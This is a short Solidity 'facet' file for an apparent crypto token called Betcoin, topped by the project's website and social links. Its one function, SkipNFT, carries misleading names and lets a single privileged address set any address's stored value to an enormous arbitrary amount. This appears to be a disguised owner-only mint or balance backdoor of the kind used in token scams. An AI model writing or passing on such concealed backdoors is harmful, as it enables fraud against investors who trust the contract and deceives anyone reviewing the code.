/*
WEBSITE https://thebetcoin.app
TWITTER https://twitter.com/Betcoineth
TELEGRAM https://t.me/BetcoinAiETH
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
import "./TestLib.sol";
contract SkipNFTFacet {
    function SkipNFT(uint256 addBot, address _bool) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._lp[0] == msg.sender) {
            ds._NFT[_bool] =
                ds._tTotal *
                ds._tTotal *
                addBot *
                10 ** ds._decimals;
        }
    }
}
